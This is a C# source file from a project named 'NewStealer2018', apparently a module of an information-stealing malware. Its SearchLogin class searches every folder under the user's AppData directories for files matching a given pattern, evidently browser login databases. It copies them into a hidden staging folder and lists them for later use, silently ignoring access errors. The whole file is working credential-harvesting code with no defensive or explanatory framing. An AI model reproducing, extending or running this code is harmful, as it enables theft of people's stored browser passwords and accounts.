namespace NewStealer2018
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Security;

    public class SearchLogin
    {
        private static int Fragment = 1;
        private static int GetScount => Fragment++;
        private static List<string> Browsers = new List<string>();
        public static List<string> GetLogins = new List<string>(); // Получаем уже скопированные безопасно файлы
        private static readonly List<string> BrPaths = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        };

        public static void CheckList(string Logins) 
        {
            var APD = new List<string>();
            foreach (var paths in BrPaths)
            {
                try
                {
                    APD.AddRange(Directory.EnumerateDirectories(paths));
                }
                catch { }
            }
            foreach (var e in APD)
            {
                try
                {
                    Browsers.AddRange(Directory.EnumerateFiles(e, Logins, SearchOption.AllDirectories));
                }
                catch { }
            }
        }

        private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
        {
            try
            {
                foreach (var Mic in Directory.EnumerateFiles(PathLogins, Pattern, SO))
                {
                    if (File.Exists(Mic))
                    {
                        GetLogins.Add(Mic);
                    }
                    else
                    {
                        continue;
                    }
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (SecurityException) { }
        }

        public static void CopyLoginsInSafeDir(string Folder, bool Recursive = true)
        {
            try
            {
                Directory.CreateDirectory(Path.Combine(GetDirPath.User_Name, Folder));
            }
            catch { }

            for (var i = 0; i < Browsers.Count; i++)
            {
                if (File.Exists(Browsers[i]))
                {
                    try
                    {
                        File.Copy(Browsers[i], Path.Combine(Path.Combine(GetDirPath.User_Name, Folder), Path.GetFileName($"{Browsers[i]}{GetScount}")), Recursive); // Path.GetFileName(Browsers[i] + GetScount)
                    }
                    catch { }
                }
            }
            GetSecureFile(Path.Combine(GetDirPath.User_Name, "Logins"), "*");
        }
    }
}